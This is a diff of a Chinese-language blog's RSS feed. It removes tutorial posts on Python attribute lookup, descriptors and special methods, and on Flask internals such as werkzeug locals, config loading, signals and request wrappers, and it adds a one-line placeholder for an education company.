-&lt;p&gt;获取属性的相关方法有&lt;code class=&quot;highlighter-rouge&quot;&gt;dir&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;getattr&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;__get__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__getattr__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__getattribute__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__dict__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.xxx&lt;/code&gt;等方式。先看示例代码：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;金榜教育&lt;/strong&gt; 致力于……&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class PropTest(object):
-    class_prop = 'class_prop'
-    def __init__(self):
-        self.obj_prop = 'obj_prop'
-    def __getattr__(self, name):
-        print('call __getattr__: name = %s' % name)
-        return name
-    def __getattribute__(self, *args, **kwargs):
-        print('call __getattribute__: name = %s' % args)
-
-&amp;gt;&amp;gt;&amp;gt; prop = PropTest()
-&amp;gt;&amp;gt;&amp;gt; prop.class_prop
-call __getattribute__: name = class_prop
-'class_prop'
-&amp;gt;&amp;gt;&amp;gt; prop.obj_prop
-call __getattribute__: name = obj_prop
-'obj_prop'
-&amp;gt;&amp;gt;&amp;gt; prop.null_prop
-call __getattribute__: name = null_prop
-call __getattr__: name = null_prop
-'null_prop'
-&amp;gt;&amp;gt;&amp;gt; getattr(prop, 'class_prop')
-call __getattribute__: name = class_prop
-'class_prop'
-&amp;gt;&amp;gt;&amp;gt; getattr(prop, 'null_prop')
-call __getattribute__: name = null_prop
-call __getattr__: name = null_prop
-'null_prop'
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;从以上例子看出来，当访问实例的属性时，只有该属性追溯不到时，才会调用&lt;code class=&quot;highlighter-rouge&quot;&gt;__getattr__&lt;/code&gt;，而无论是否属性存在于否都会调用__getattribute__。而内建函数&lt;code class=&quot;highlighter-rouge&quot;&gt;getattr(prop, 'null_prop')&lt;/code&gt;的调用，等价于&lt;code class=&quot;highlighter-rouge&quot;&gt;prop.null_prop&lt;/code&gt;。&lt;/p&gt;
-
-&lt;p&gt;此外属性可以是一种特殊形式，称之为&lt;strong&gt;描述符&lt;/strong&gt;，如flask的config里：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class ConfigAttribute(object):
-    &quot;&quot;&quot;Makes an attribute forward to the config&quot;&quot;&quot;
-
-    def __init__(self, name, get_converter=None):
-        self.__name__ = name
-        self.get_converter = get_converter
-
-    def __get__(self, obj, type=None):
-        if obj is None:
-            return self
-        rv = obj.config[self.__name__]
-        if self.get_converter is not None:
-            rv = self.get_converter(rv)
-        return rv
-
-    def __set__(self, obj, value):
-        obj.config[self.__name__] = value
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;flask app里很多属性都定义成为ConfigAttribute类型，如：&lt;code class=&quot;highlighter-rouge&quot;&gt;debug = ConfigAttribute('DEBUG')&lt;/code&gt;，ConfigAttribute内部实现了&lt;code class=&quot;highlighter-rouge&quot;&gt;__get__&lt;/code&gt;，和&lt;code class=&quot;highlighter-rouge&quot;&gt;__set__&lt;/code&gt;方法，如果这两个方法都实现了，称之为data descriptor，当访问这类属性时，会优先返回ConfigAttribute里的&lt;code class=&quot;highlighter-rouge&quot;&gt;__get__&lt;/code&gt;方法结果，而只实现了&lt;code class=&quot;highlighter-rouge&quot;&gt;__get__&lt;/code&gt;方法的称之为，non-data descriptor，则优先从obj，类，所有父类的&lt;code class=&quot;highlighter-rouge&quot;&gt;__dict__&lt;/code&gt;里去找结果。&lt;/p&gt;
-
-&lt;p&gt;重新整理下属性搜索流程：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;如果attr是一个Python自动产生的属性，直接找到！&lt;/li&gt;
-  &lt;li&gt;查找&lt;code class=&quot;highlighter-rouge&quot;&gt;obj.__class__.__dict__&lt;/code&gt;，如果attr存在并且是data descriptor，返回data descriptor的&lt;code class=&quot;highlighter-rouge&quot;&gt;__get__&lt;/code&gt;方法的结果，如果没有继续在   &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.__class__&lt;/code&gt;的父类以及祖先类中寻找data descriptor&lt;/li&gt;
-  &lt;li&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;obj.__dict__&lt;/code&gt;中查找，这一步分两种情况，第一种情况是obj是一个普通实例，找到就直接返回，找不到进行下一步。第二种情况是obj是一个类，依次在obj和它的父类、祖先类的&lt;code class=&quot;highlighter-rouge&quot;&gt;__dict__&lt;/code&gt;中查找，如果找到一个descriptor就返回descriptor的&lt;code class=&quot;highlighter-rouge&quot;&gt;__get__&lt;/code&gt;方法的结果，否则直接返回attr。如果没有找到，进行下一步。&lt;/li&gt;
-  &lt;li&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;obj.__class__.__dict__&lt;/code&gt;中查找，如果找到了一个descriptor(插一句：这里的descriptor一定是non-data descriptor，如果它是data descriptor，第二步就找到它了descriptor的__get__方法的结果。如果找到一个普通属性，直接返回属性值。如果没找到，进行下一步&lt;/li&gt;
-  &lt;li&gt;调用&lt;code class=&quot;highlighter-rouge&quot;&gt;__getattr__&lt;/code&gt;，返回&lt;code class=&quot;highlighter-rouge&quot;&gt;__getattr__&lt;/code&gt;的执行结果&lt;/li&gt;
-  &lt;li&gt;raise AttributeError&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;strong&gt;@property，和property()的调用&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;property()&lt;/code&gt;，为内置类，原型为&lt;code class=&quot;highlighter-rouge&quot;&gt;class property(fget=None, fset=None, fdel=None, doc=None)&lt;/code&gt;，个人理解为可自定义三个方法去间接操作属性，比如flask里RequestContext里的g属性：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class RequestContext(object):
-    def _get_g(self):
-        return _app_ctx_stack.top.g
-    def _set_g(self, value):
-        _app_ctx_stack.top.g = value
-    g = property(_get_g, _set_g)
-    del _get_g, _set_g
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;@property，为decorator，上面写法等价于&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RequestContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;@property&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_app_ctx_stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;
-
-    &lt;span class=&quot;err&quot;&gt;@g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setter&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;_app_ctx_stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;以上：python为了通过使用&lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt;调用属性方式，做了很多实现和黑魔法。&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;其他特殊保留属性&quot;&gt;其他特殊保留属性&lt;/h4&gt;
-
-&lt;p&gt;保留属性&lt;/p&gt;
-&lt;table&gt;
-    &lt;tr&gt;
-        &lt;th&gt;保留变量&lt;/th&gt;
-        &lt;th&gt;说明&lt;/th&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;Class.__doc__&lt;/td&gt;
-        &lt;td&gt;类型帮助信息&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;Class.__name__&lt;/td&gt;
-        &lt;td&gt;类名称&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;Class.__module__&lt;/td&gt;
-        &lt;td&gt;类所在模块&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;Class.__bases__&lt;/td&gt;
-        &lt;td&gt;类所继承的基类 (&amp;lt;type 'object'&amp;gt;,) &lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;Class.__dict__&lt;/td&gt;
-        &lt;td&gt;类型字典，存储所有类型成员信息&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;Class().__module__&lt;/td&gt;
-        &lt;td&gt;实例所在模块'__main__' &lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;Class().__dict__ &lt;/td&gt;
-        &lt;td&gt;对象字典，存储所有实例成员信息&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;__name__&lt;/td&gt;
-        &lt;td&gt;类名称&lt;/td&gt;
-    &lt;/tr&gt;
-&lt;/table&gt;
-
-&lt;p&gt;保留方法&lt;/p&gt;
-
-&lt;table&gt;
-    &lt;tr&gt;
-        &lt;th&gt;代码&lt;/th&gt;
-        &lt;th&gt;实际调用&lt;/th&gt;
-        &lt;th&gt;说明&lt;/th&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;x = Class()&lt;/td&gt;
-        &lt;td&gt;x.__new__()&lt;/td&gt;
-        &lt;td&gt;初始化一个实例&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;repr(x)&lt;/td&gt;
-        &lt;td&gt;x.__repr__()&lt;/td&gt;
-        &lt;td&gt;字符串的“官方”表现形式&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;str(x)&lt;/td&gt;
-        &lt;td&gt;x.__str__()&lt;/td&gt;
-        &lt;td&gt;字符串的“非正式”值&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;iter(x)&lt;/td&gt;
-        &lt;td&gt;iter.__iter__()&lt;/td&gt;
-        &lt;td&gt;遍历某个序列&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;reversed(x)&lt;/td&gt;
-        &lt;td&gt;x.__reversed__()&lt;/td&gt;
-        &lt;td&gt;按逆序创建一个迭代器&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;x.my_property&lt;/td&gt;
-        &lt;td&gt;x.__getattribute__('my_property')&lt;/td&gt;
-        &lt;td&gt;获取一个属性（无条件的）&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;x.my_property&lt;/td&gt;
-        &lt;td&gt;x.__getattr__('my_property')&lt;/td&gt;
-        &lt;td&gt;获取一个属性（找不到时）&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;x.my_property = value&lt;/td&gt;
-        &lt;td&gt;x.__setattr__('my_property',value)&lt;/td&gt;
-        &lt;td&gt;设置某属性&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;del x.my_property&lt;/td&gt;
-        &lt;td&gt;x.__delattr__('my_property')&lt;/td&gt;
-        &lt;td&gt;删除某属性&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;dir(x)&lt;/td&gt;
-        &lt;td&gt;x.__dir__()&lt;/td&gt;
-        &lt;td&gt;列出所有属性和方法&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;x()&lt;/td&gt;
-        &lt;td&gt;x.__call__()&lt;/td&gt;
-        &lt;td&gt;将实例当函数一样调用&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;len(x)&lt;/td&gt;
-        &lt;td&gt;x.__len__()&lt;/td&gt;
-        &lt;td&gt;序列的长度&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;x in seq&lt;/td&gt;
-        &lt;td&gt;x.__contains__(x)&lt;/td&gt;
-        &lt;td&gt;了解某序列是否包含特定的值&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;x[key]&lt;/td&gt;
-        &lt;td&gt;x.__getitem__(key)&lt;/td&gt;
-        &lt;td&gt;通过键来获取值&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;x[key] = value&lt;/td&gt;
-        &lt;td&gt;x.__setitem__(key, value)&lt;/td&gt;
-        &lt;td&gt;通过键来设置值&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;del x[key]&lt;/td&gt;
-        &lt;td&gt;x.__delitem__(key)&lt;/td&gt;
-        &lt;td&gt;删除一个键值对&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;x[nonexistent_key]&lt;/td&gt;
-        &lt;td&gt;x.__missing__(nonexistent_key)&lt;/td&gt;
-        &lt;td&gt;为缺失键提供默认值&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;with x&lt;/td&gt;
-        &lt;td&gt;x.__enter__() x.__exit__()&lt;/td&gt;
-        &lt;td&gt;在进入或退出with块时分别调用enter和exit&lt;/td&gt;
-    &lt;/tr&gt;
-&lt;/table&gt;
-
-&lt;h3 id=&quot;flask里重命名的class&quot;&gt;Flask里重命名的Class&lt;/h3&gt;
-
-&lt;p&gt;Flask类定义里，将很多类重新赋值给类变量：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#: The class that is used for request objects.  See :class:`~flask.Request`
-#: for more information.
-request_class = Request
-
-#: The class that is used for response objects.  See
-#: :class:`~flask.Response` for more information.
-response_class = Response
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Flask里将很多对象都重新命名为&lt;code class=&quot;highlighter-rouge&quot;&gt;xxx_class&lt;/code&gt;, Flask是暴露出去的核心类，也是整个框架起桥梁这样的类，这样如果想增加Response功能，只需要重新写个类比如&lt;code class=&quot;highlighter-rouge&quot;&gt;XResponse&lt;/code&gt;，并重新赋值&lt;code class=&quot;highlighter-rouge&quot;&gt;app.response_class = XResponse&lt;/code&gt; 既可。&lt;/p&gt;
-</description>
-        <pubDate>Sat, 29 Jul 2017 10:18:01 +0800</pubDate>
-        <link>http://localhost:4000/2017/07/29/flask%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</link>
-        <guid isPermaLink="true">http://localhost:4000/2017/07/29/flask%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</guid>
-        
-        <category>总结</category>
-        
-        
-        <category>reading</category>
-        
-      </item>
-    
-      <item>
-        <title>flask源码</title>
-        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#wsgi&quot; id=&quot;markdown-toc-wsgi&quot;&gt;wsgi&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#werkzeug-local&quot; id=&quot;markdown-toc-werkzeug-local&quot;&gt;werkzeug local&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#pytest&quot; id=&quot;markdown-toc-pytest&quot;&gt;pytest&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#config&quot; id=&quot;markdown-toc-config&quot;&gt;config&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#globals&quot; id=&quot;markdown-toc-globals&quot;&gt;globals&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#_compat&quot; id=&quot;markdown-toc-_compat&quot;&gt;_compat&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#signals&quot; id=&quot;markdown-toc-signals&quot;&gt;signals&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#wrappers&quot; id=&quot;markdown-toc-wrappers&quot;&gt;wrappers&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#sessions&quot; id=&quot;markdown-toc-sessions&quot;&gt;sessions&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#templating&quot; id=&quot;markdown-toc-templating&quot;&gt;templating&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;config原理，其他模块调用config的地方&lt;/li&gt;
-  &lt;li&gt;路由原理&lt;/li&gt;
-  &lt;li&gt;Wsgi接口调用&lt;/li&gt;
-  &lt;li&gt;理解session&lt;/li&gt;
-  &lt;li&gt;理解threading.local&lt;/li&gt;
-  &lt;li&gt;理解flask自己封装的thread local&lt;/li&gt;
-  &lt;li&gt;理解g和request&lt;/li&gt;
-  &lt;li&gt;理解app context和request context&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h3 id=&quot;wsgi&quot;&gt;wsgi&lt;/h3&gt;
-
-&lt;p&gt;WSGI接口定义非常简单，它只要求Web开发者实现一个函数，就可以响应HTTP请求。&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def application(environ, start_response):
-    start_response('200 OK', [('Content-Type', 'text/html')])
-    return '&amp;lt;h1&amp;gt;Hello, web!&amp;lt;/h1&amp;gt;'
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;上面的application()函数就是符合WSGI标准的一个HTTP处理函数，它接收两个参数：
-environ：一个包含所有HTTP请求信息的dict对象；
-start_response：一个发送HTTP响应的函数。&lt;/p&gt;
-
-&lt;p&gt;再启动WSGI服务器，去加载application，整个最简单的web应用就建立起来了&lt;/p&gt;
-
-&lt;h3 id=&quot;werkzeug-local&quot;&gt;werkzeug local&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;local&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Local 是个线程局部对象，里面有个&lt;code class=&quot;highlighter-rouge&quot;&gt;__storage__&lt;/code&gt;: &lt;code class=&quot;highlighter-rouge&quot;&gt;storage[ident][name] = value&lt;/code&gt;, ident为线程或协程id&lt;/p&gt;
-
-&lt;p&gt;实现&lt;code class=&quot;highlighter-rouge&quot;&gt;__getattr__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__setattr__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__delattr__&lt;/code&gt;, 好让dict里的k-v能通过’.’调用&lt;/p&gt;
-
-&lt;p&gt;实现&lt;code class=&quot;highlighter-rouge&quot;&gt;__call__&lt;/code&gt;，通过类似函数调用生成LocalProxy代理&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;LocalStack&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;封装了&lt;code class=&quot;highlighter-rouge&quot;&gt;local&lt;/code&gt;，不过local内只有一个叫&lt;code class=&quot;highlighter-rouge&quot;&gt;stack&lt;/code&gt;的k-v，其value是list，所以能实现push，pop，top&lt;/p&gt;
-
-&lt;p&gt;而pop到最后一个元素时，会把local dict里面的stack对象给pop掉，等push时重新创建&lt;/p&gt;
-
-&lt;p&gt;flask 里面的这个list存放的是object，object又有一些属性数据&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_request_ctx_stack = LocalStack()
-_app_ctx_stack = LocalStack()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;pytest&quot;&gt;pytest&lt;/h3&gt;
-
-&lt;p&gt;http://blog.csdn.net/wwq_1111/article/details/51242011&lt;/p&gt;
-
-&lt;h3 id=&quot;config&quot;&gt;config&lt;/h3&gt;
-
-&lt;p&gt;config模块本质上是一个dict，存储一些k-v，支持多种加载模式：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;从py文件加载，用types创建一个临时模块config，解析py字节流，将全局变量存储到config模块的__dict__里。&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;exec(compile(config_file.read(), filename, 'exec'), d.__dict__)&lt;/code&gt;。compile编译序列语句，exec，执行，将结果保存到dict里面&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;从模块加载：用dir获取模块的属性，如果是大写的就存储到dict里面&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;from_object，也可以提供模块名称，这样会先import模块，再解析模块属性&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h3 id=&quot;globals&quot;&gt;globals&lt;/h3&gt;
-
-&lt;p&gt;保存了两个线程局部变量&lt;code class=&quot;highlighter-rouge&quot;&gt;_request_ctx_stack&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;_app_ctx_stack&lt;/code&gt;, 前者保存了request, session信息，后者保存了app，g信息。
-为什么&lt;code class=&quot;highlighter-rouge&quot;&gt;_request_ctx_stack.top&lt;/code&gt;，就是当前的活跃request？&lt;/p&gt;
-
-&lt;h3 id=&quot;_compat&quot;&gt;_compat&lt;/h3&gt;
-
-&lt;p&gt;py2/py3 版本兼容，定义了text_type，string_types，integer_types，iterkeys，itervalues，iteritems，reraise，BROKEN_PYPY_CTXMGR_EXIT&lt;/p&gt;
-
-&lt;h3 id=&quot;signals&quot;&gt;signals&lt;/h3&gt;
-
-&lt;p&gt;flask的signals 基于blinker实现信号的发送和订阅&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;创建信号&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_signals = Namespace()
-template_rendered = _signals.signal('template-rendered')
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;通过signal()，以名字为参数创建信号&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;订阅信号&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;使用Signal.connect()方法注册一个回调函数（即订阅者），处理触发的信号，该函数以触发信号的对象作为参数。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;触发信号&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;使用Signal.send()方法通知信号订阅者。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;flask 核心信号&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;template_rendered = _signals.signal('template-rendered')
-before_render_template = _signals.signal('before-render-template')
-request_started = _signals.signal('request-started')
-request_finished = _signals.signal('request-finished')
-request_tearing_down = _signals.signal('request-tearing-down')
-got_request_exception = _signals.signal('got-request-exception')
-appcontext_tearing_down = _signals.signal('appcontext-tearing-down')
-appcontext_pushed = _signals.signal('appcontext-pushed')
-appcontext_popped = _signals.signal('appcontext-popped')
-message_flashed = _signals.signal('message-flashed')
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;wrappers&quot;&gt;wrappers&lt;/h3&gt;
-
-&lt;p&gt;封装了werkzeug.wrappers的Request和Response，做了个mimetype为json的数据解析&lt;/p&gt;
-
-&lt;p&gt;request和response，包含了请求和回应的 header和body，以及url解析内容&lt;/p&gt;
-
-&lt;p&gt;url参数可使用常见参数：&lt;/p&gt;
-
-&lt;p&gt;假设用户请求为&lt;code class=&quot;highlighter-rouge&quot;&gt;http://www.example.com/myapplication/page.html?x=y&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;则解析如下：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;path        /page.html
-script_root /myapplication
-base_url    http://www.example.com/myapplication/page.html
-url         http://www.example.com/myapplication/page.html?x=y
-url_root    http://www.example.com/myapplication/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;数据内容可使用常见参数：
-form args values cookies headers data files method 等。&lt;/p&gt;
-
-&lt;h3 id=&quot;sessions&quot;&gt;sessions&lt;/h3&gt;
-
-&lt;p&gt;用户会话，用于存储请求之间需要记住的键值对&lt;/p&gt;
-
-&lt;p&gt;处理登录，token处理，和跨站攻击&lt;/p&gt;
-
-&lt;p&gt;http://blog.csdn.net/hyman_c/article/details/54023685&lt;/p&gt;
-
-&lt;p&gt;http://www.tuicool.com/articles/M3Q3ui&lt;/p&gt;
-
-&lt;p&gt;http://www.jianshu.com/p/46fd7e66b7d5&lt;/p&gt;
-
-&lt;p&gt;http://itsdangerous.readthedocs.io/en/latest/&lt;/p&gt;
-
-&lt;p&gt;http://docs.jinkan.org/docs/flask/testing.html#testing&lt;/p&gt;
-
-&lt;h3 id=&quot;templating&quot;&gt;templating&lt;/h3&gt;
-</description>
-        <pubDate>Thu, 29 Jun 2017 10:09:01 +0800</pubDate>
-        <link>http://localhost:4000/2017/06/29/flask/</link>
-        <guid isPermaLink="true">http://localhost:4000/2017/06/29/flask/</guid>
-        
-        <category>总结</category>
-        
-        
-        <category>document</category>
-        
-      </item>
-    
-      <item>
-        <title>python基础(二)</title>
-        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#高阶函数&quot; id=&quot;markdown-toc-高阶函数&quot;&gt;高阶函数&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#函数式编程&quot; id=&quot;markdown-toc-函数式编程&quot;&gt;函数式编程&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#模块&quot; id=&quot;markdown-toc-模块&quot;&gt;模块&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#面相对象编程&quot; id=&quot;markdown-toc-面相对象编程&quot;&gt;面相对象编程&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;本片文章记录python一些特性和用法。&lt;/p&gt;
-
-&lt;h3 id=&quot;高阶函数&quot;&gt;高阶函数&lt;/h3&gt;
-
-&lt;p&gt;和js里面一样，函数可以赋值给一个变量：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; f = abs
-&amp;gt;&amp;gt;&amp;gt; f(-10)
-10
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;也可以当作参数：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def add(x, y, f):
-    return f(x) + f(y)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
